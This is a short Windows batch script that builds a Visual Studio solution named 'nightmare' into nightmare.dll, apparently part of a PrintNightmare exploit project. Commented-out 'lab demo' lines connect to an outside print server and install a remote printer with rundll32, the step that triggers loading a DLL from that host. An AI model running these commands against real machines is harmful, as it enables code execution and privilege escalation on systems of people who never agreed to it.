@echo off
REM build_windows.bat
REM -----------------
REM Automated build script for NSFW DLL and Nightmare solution on Windows 11.
REM Prerequisites: Visual Studio 2022+ with C++ workload installed and MSBuild in PATH.

REM --- Usage ---
REM 1. Open a Developer Command Prompt for VS 2022.
REM 2. Run this script from the repository root.

REM Set up environment (adjust path if needed)
call "%ProgramFiles(x86)%\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

REM Build the solution in Release mode
msbuild core\nightmare\nightmare.sln /p:Configuration=Release /p:Platform=x64

REM Output location
if exist core\nightmare\x64\Release\nightmare.dll (
    echo [*] Build succeeded! DLL is at core\nightmare\x64\Release\nightmare.dll
) else (
    echo [!] Build failed. Check the output above for errors.
    exit /b 1
)

REM Example: Connect to remote printer (optional, for lab demo)
REM net use \\printnightmare.gentilkiwi.com\ipc$ /user:gentilguest password
REM rundll32 printui.dll,PrintUIEntry /in /n"\\printnightmare.gentilkiwi.com\Kiwi Legit Printer"

pause
